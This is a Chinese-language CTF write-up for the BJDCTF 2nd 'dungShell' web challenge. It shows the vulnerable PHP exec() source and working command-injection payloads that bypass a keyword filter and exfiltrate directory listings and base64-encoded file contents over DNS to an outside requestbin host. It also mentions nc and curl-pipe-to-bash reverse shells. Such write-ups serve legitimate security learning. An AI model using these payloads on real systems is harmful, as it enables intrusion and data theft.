---
layout: post
title: BJDCTF 2nd Web Writeup
data: 2020-03-23
categories: Writeups
tags: 
 - CTF
 - Writeup
description:  
excerpt_separator: <!-- more -->
---

上周末BJD第二场，又是一届新生赛，尽管如此还是暴露出了很多问题。这段时间就先把这次总结出来的问题解决一下。

<!-- more -->

# dungShell

## 题目描述

提示写到脸上了，有.swp文件。

## 解题思路

源码删减：

{% highlight php linenos %}
<?php
error_reporting(0);
echo "how can i give you source code? .swp?!"."<br>";
if (!isset($_POST['girl_friend'])) {
    die("where is P3rh4ps's girl friend ???");
} else {
    $girl = $_POST['girl_friend'];
    if (preg_match('/\>|\\\/', $girl)) {
        die('just girl');
    } else if (preg_match('/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i', $girl)) {
        echo "<img src='img/p3_need_beautiful_gf.png'> <!-- He is p3 -->";
    } else {
        //duangShell~~~~
        exec($girl);
    }
}
{% endhighlight %}

拦截形同虚设，可以用"php -r"执行PHP代码。不过没有回显，需要将结果打到DNS上。

扫根目录：


```
POST：girl_friend=php -r "system('ping '.substr(implode('.',scandir('/')),6,50).'.295af172a8d3ec4abf30.d.dns.requestbin.buuoj.cn');"
```

读/flag：

```
POST：girl_friend=php -r "system('ping '.substr(system('bas""e64 /flag'),0,50).'.295af172a8d3ec4abf30.d.dns.requestbin.buuoj.cn');"
```

分两次读，解码后：

```
flag{flag-is-not-here,please-find-it-by-yourself}
```

不太对劲，要找真正的flag，在.bash_history里面看到了信息，然后再读：

```
POST：girl_friend=php -r "system('ping '.substr(system('bas""e64 /etc/demo/P3rh4ps/love/flag'),0,50).'.46418d29ca743ab417af.d.dns.requestbin.buuoj.cn');"
```

## 备注

1. 后来看题解，发现我好像非预期了，.bash_history是个意外，预期思路应该是用nc命令或者curl xxxx\|bash弹Shell，然后find一下flag。

2. 因为find命令会返回不止一行，而我的方法是利用了system()的返回，所以不太好用。当然也不是不可以，可以先将find的返回保存到变量foo中，然后echo一下\${foo}。至于"$"符号的绕过，可以先将命令base64编码，传到服务器再解码，然后重定向到bash里，Payload大概长这样：

    ```
    POST：girl_friend=php -r "system('ping '.substr(system('ec""ho YT0kKGZpbmQgLyAtbmFtZSBmbGFnKTtlY2hvICR7YToxMDoxNX18YmFzZTY0Cg==|ba""se64 -d|bash'),0,50).'.f9a0ea65a00ba5753d08.d.dns.requestbin.buuoj.cn');"
    
    YT0kKGZpbmQgLyAtbmFtZSBmbGFnKTtlY2hvICR7YToxMDoxNX18YmFzZTY0Cg== => a=$(find / -name flag);echo ${a:10:15}|base64
    ```

3. 不得不说，上面这个方法太蛋疼了，得整一个VPS工具。